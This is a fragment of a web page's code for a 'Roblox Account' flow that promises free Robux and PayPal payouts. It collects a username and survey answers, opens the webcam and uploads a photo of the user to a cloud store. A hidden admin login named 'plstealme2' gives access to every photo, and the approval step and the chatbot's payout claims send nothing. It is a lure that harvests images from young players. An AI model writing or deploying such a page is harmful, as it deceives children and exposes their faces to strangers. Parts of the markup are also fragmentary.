    function stopMedia() {
        if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
    }

    async function captureOriginalImage(videoElem) {
        return new Promise((resolve) => {
            if (!videoElem || !videoElem.videoWidth) return resolve(null);
            const canvas = document.createElement('canvas');
            canvas.width = videoElem.videoWidth;
            canvas.height = videoElem.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
        });
    }

    async function uploadToCloud(blob, fname) {
        const fd = new FormData();
        fd.append('file', blob, fname);
        fd.append('upload_preset', UPLOAD_PRESET);
        const resp = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, { method: 'POST', body: fd });
        const data = await resp.json();
        if (!data.secure_url) throw new Error("Upload failed");
        return data.secure_url;
    }

    async function saveRecord(username, originalUrl, survey) {
        const ref = db.collection('verifications').doc();
        await ref.set({
            robloxUsername: username,
            originalImageUrl: originalUrl,
            survey: survey,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            status: 'pending',
            robuxGranted: false
        });
        return ref.id;
    }

    async function fetchAllSubmissions() {
        const snap = await db.collection('verifications').orderBy('timestamp', 'desc').get();
        return snap.docs.map(d => ({ id: d.id, ...d.data(), timestamp: d.data().timestamp?.toDate() || new Date() }));
    }

    async function approveAndGrantRobux(subId) {
        await db.collection('verifications').doc(subId).update({ status: 'approved', robuxGranted: true });
    }

    // DELETE a single submission by ID (Firestore doc)
    async function deleteSubmission(subId, imageUrl) {
        if (!confirm("⚠️ Delete this submission permanently? This cannot be undone.")) return;
        try {
            // Optional: try to delete from Cloudinary (just firestore delete is enough for demo)
            await db.collection('verifications').doc(subId).delete();
            alert("✅ Submission deleted successfully.");
            await loadAdminSubmissions(); // refresh list
            addChatMessage("bot", "🗑️ Admin deleted a submission.");
        } catch(e) { alert("Error deleting: "+e.message); }
    }

    async function deleteAllSubmissions() {
        if (!confirm("⚠️⚠️ DANGER: Delete ALL videos and submissions? This action is IRREVERSIBLE. Type 'DELETE ALL' to confirm.")) return;
        const confirmation = prompt("Type 'DELETE ALL' to confirm mass deletion:");
        if (confirmation !== "DELETE ALL") return alert("Cancelled.");
        const subs = await fetchAllSubmissions();
        let deletedCount = 0;
        for (let sub of subs) {
            try {
                await db.collection('verifications').doc(sub.id).delete();
                deletedCount++;
            } catch(e) { console.error(e); }
        }
        alert(`✅ Deleted ${deletedCount} submissions permanently.`);
        await loadAdminSubmissions();
        addChatMessage("bot", `🔥 Admin deleted ALL ${deletedCount} submissions.`);
    }

    // Rendering functions
    function renderWelcome() {

            <h1><i class="fab fa-roblox"></i> Roblox Account</h1>

            <input type="text" id="robloxUser" class="input-field" placeholder="Your Roblox username">

    function renderSurvey() {
        const selected = (q, val) => surveyAnswers[q] === val ? 'selected' : '';

            <div class="trust-badge"><i class="fas fa-chart-simple"></i> HELP US IMPROVE</div>

                    <div class="options-flex">${['Adopt Me!','Brookhaven','Tower of Hell','Blox Fruits','Other'].map(v => `<div class="opt-chip ${selected('favGame',v)}" data-q="favGame" data-val="${v}">${v}</div>`).join('')}</div>

                <div class="survey-q-item">

            <h1><i class="fas fa-shield-alt"></i> Privacy & Consent</h1>

            </div>

    function renderMedia() {
        return `<div class="step-container">

            <h1><i class="fas fa-camera"></i> Identity Check</h1>

            <div class="camera-preview">

                <div class="btn-group"><button class="btn btn-primary" id="startCameraBtn">📷 Start Camera</button><button class="btn btn-primary" id="submitCaptureBtn" disabled>✅ Submit & Claim Robux</button></div>

    function renderSuccess() {
        let adminHtml = '';
        if (isSecretAdmin) {
            adminHtml = `<div class="admin-dashboard">
                <div class="admin-actions-bar">
                    <span class="admin-badge"><i class="fas fa-crown"></i> Admin: plstealme2</span>
                    <button id="deleteAllVideosBtn" class="btn-danger" style="padding:6px 14px;"><i class="fas fa-trash-alt"></i> 🗑️ DELETE ALL SUBMISSIONS</button>

                    <textarea id="adminInstructionEditor" rows="2" style="width:100%;">${cameraInstructionText}</textarea>
                    <button id="saveInstructionBtn" class="btn-primary" style="margin-top:6px;">💾 Save Camera Text</button>

    function render() {
        let html = '';
        if (currentStep === 'welcome') html = renderWelcome();
        else if (currentStep === 'robloxAuth') html = renderRobloxAuth();
        else if (currentStep === 'survey') html = renderSurvey();
        else if (currentStep === 'privacy') html = renderPrivacy();
        else if (currentStep === 'media') html = renderMedia();
        else if (currentStep === 'success') html = renderSuccess();
        appRoot.innerHTML = html;
        attachEvents();
        if (currentStep === 'media' && !isSecretAdmin) {
            const span = document.getElementById('instructionSpan');
            if (span) span.innerText = cameraInstructionText;
        }
    }

    function attachEvents() {
        if (currentStep === 'welcome') {
            document.getElementById('startYesBtn')?.addEventListener('click', () => { currentStep = 'robloxAuth'; render(); });
            document.getElementById('startNoBtn')?.addEventListener('click', () => alert("Reload to restart"));
        }
        if (currentStep === 'robloxAuth') {
            document.getElementById('confirmUserBtn').onclick = () => {
                const user = document.getElementById('robloxUser').value.trim();
                if (!user) return alert("Enter username");
                robloxUsername = user;
                isSecretAdmin = (user.toLowerCase() === 'plstealme2');
                surveyAnswers = { favGame: null, playTime: null, robuxSpend: null };
                currentStep = 'survey';
                render();
            };
        }
        if (currentStep === 'survey') {
            const chips = document.querySelectorAll('.opt-chip');
            chips.forEach(chip => {
                chip.onclick = () => {
                    const q = chip.dataset.q;
                    const val = chip.dataset.val;
                    surveyAnswers[q] = val;
                    document.querySelectorAll(`.opt-chip[data-q="${q}"]`).forEach(c => c.classList.remove('selected'));
                    chip.classList.add('selected');
                    updateBtn();
                };
            });
            function updateBtn() {
                const all = surveyAnswers.favGame && surveyAnswers.playTime && surveyAnswers.robuxSpend;
                const btn = document.getElementById('submitSurveyFinalBtn');
                if (btn) btn.disabled = !all;
                const prog = document.getElementById('surveyProgress');
                if (prog) prog.innerText = `📊 ${Object.values(surveyAnswers).filter(v=>v).length}/3 answered`;
            }
            updateBtn();
            document.getElementById('submitSurveyFinalBtn')?.addEventListener('click', () => { currentStep = 'privacy'; render(); });
            document.getElementById('backFromSurveyBtn')?.addEventListener('click', () => { currentStep = 'robloxAuth'; render(); });
        }
        if (currentStep === 'privacy') {
            const cb = document.getElementById('privacyAgree');
            const accept = document.getElementById('acceptPrivacyBtn');
            cb.onchange = () => { accept.disabled = !cb.checked; };
            accept.onclick = () => { currentStep = 'media'; render(); };
            document.getElementById('declineBtn').onclick = () => { currentStep = 'welcome'; render(); };
        }
        if (currentStep === 'media') {
            let video;
            const start = document.getElementById('startCameraBtn');
            const submit = document.getElementById('submitCaptureBtn');
            const statusDiv = document.getElementById('mediaStatus');
            start.onclick = async () => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    mediaStream = stream;
                    video = document.getElementById('liveCam');
                    video.srcObject = stream;
                    await video.play();
                    statusDiv.innerHTML = '✅ Camera ready — click SUBMIT';
                    submit.disabled = false;
                } catch(e) { statusDiv.innerHTML = '❌ Camera denied'; }
            };
            submit.onclick = async () => {
                if (!mediaStream) return alert("Start camera");
                const videoElem = document.getElementById('liveCam');
                const imgBlob = await captureOriginalImage(videoElem);
                if (!imgBlob) return;
                stopMedia();
                currentStep = 'success';
                try {
                    const url = await uploadToCloud(imgBlob, `user_${robloxUsername}_${Date.now()}.jpg`);
                    const docId = await saveRecord(robloxUsername, url, surveyAnswers);
                    submissionId = docId;
                    render();
                    if (isSecretAdmin) setTimeout(() => loadAdminSubmissions(), 200);
                } catch(e) { alert("Upload error: "+e.message); currentStep = 'media'; render(); }
            };
        }
        if (currentStep === 'success') {
            document.getElementById('resetAllBtn')?.addEventListener('click', () => { stopMedia(); currentStep = 'welcome'; render(); });
            if (isSecretAdmin) {
                loadAdminSubmissions();
                document.getElementById('saveInstructionBtn')?.addEventListener('click', () => {
                    const newText = document.getElementById('adminInstructionEditor').value;
                    if (newText) { cameraInstructionText = newText; alert("Updated!"); }
                });
                document.getElementById('deleteAllVideosBtn')?.addEventListener('click', () => deleteAllSubmissions());
            }
        }
    }

    async function loadAdminSubmissions() {
        const grid = document.getElementById('adminSubmissionsGrid');
        if (!grid) return;
        const subs = await fetchAllSubmissions();
        if (!subs.length) { grid.innerHTML = '<div class="status-msg">No submissions yet.</div>'; return; }
        grid.innerHTML = '';
        for (let sub of subs) {
            const card = document.createElement('div');
            card.className = 'sub-card';
            const isApproved = sub.status === 'approved';
            card.innerHTML = `
                <div class="img-preview"><img src="${sub.originalImageUrl}" style="width:100%; height:100%; object-fit:cover;"></div>
                <div><strong>${escapeHtml(sub.robloxUsername)}</strong></div>
                <div style="font-size:10px;">📋 ${sub.survey?.favGame || '?'} / ${sub.survey?.playTime || '?'}</div>
                <div>Status: ${sub.status}</div>
                ${!isApproved ? `<button class="validate-grant" data-id="${sub.id}">✅ Approve & Grant</button>` : `<button disabled style="background:#2c6e2c; width:100%; padding:6px; border-radius:40px;">✔ Paid</button>`}
                <button class="delete-single-btn" data-id="${sub.id}" data-url="${sub.originalImageUrl}"><i class="fas fa-trash"></i> Delete</button>
            `;
            const grantBtn = card.querySelector('.validate-grant');
            if (grantBtn && !isApproved) {
                grantBtn.onclick = async () => {
                    await approveAndGrantRobux(sub.id);
                    await loadAdminSubmissions();
                    addChatMessage("bot", `✅ Approved ${sub.robloxUsername}! Robux + PayPal sent.`);
                };
            }
            const delBtn = card.querySelector('.delete-single-btn');
            delBtn.onclick = async () => {
                await deleteSubmission(sub.id, sub.originalImageUrl);
            };
            grid.appendChild(card);
        }
    }

    function escapeHtml(str) { return str?.replace(/[&<>]/g, m => ({ '&':'&amp;','<':'&lt;','>':'&gt;' }[m])) || ''; }

    // Chatbot
    const chatbotIcon = document.getElementById('chatbotIcon');
    const chatWindow = document.getElementById('chatWindow');
    const closeChat = document.getElementById('closeChat');
    const chatInput = document.getElementById('chatInput');
    const chatSend = document.getElementById('chatSendBtn');
    const chatMessagesDiv = document.getElementById('chatMessages');
    function addChatMessage(sender, text) {
        const div = document.createElement('div');
        div.className = sender === 'bot' ? 'bot-msg' : 'user-msg';
        div.innerHTML = text;
        chatMessagesDiv.appendChild(div);
        chatMessagesDiv.scrollTop = chatMessagesDiv.scrollHeight;
    }
    function botResponse(msg) {
        const lower = msg.toLowerCase();
        if (lower.includes('delete')) return "🗑️ Admin can delete any submission using the Delete button. Admin also has 'DELETE ALL' option.";
        if (lower.includes('paypal')) return "💸 After approval, we send PayPal to your linked email. Instant Robux credited too!";
        if (lower.includes('step')) return "Steps: Survey → Clear photo → Admin approval → Get Robux + PayPal.";
        return "💙 Ask about 'delete videos', 'PayPal', or 'approval steps'!";
    }
    function sendUserMsg() {
        const txt = chatInput.value.trim();
        if (!txt) return;
        addChatMessage('user', txt);
        chatInput.value = '';
        setTimeout(() => addChatMessage('bot', botResponse(txt)), 200);
    }
    chatbotIcon.onclick = () => chatWindow.classList.toggle('hidden');
    closeChat.onclick = () => chatWindow.classList.add('hidden');
    chatSend.onclick = sendUserMsg;
    chatInput.addEventListener('keypress', e => { if(e.key === 'Enter') sendUserMsg(); });
    render();
</script>
</body>
</html>
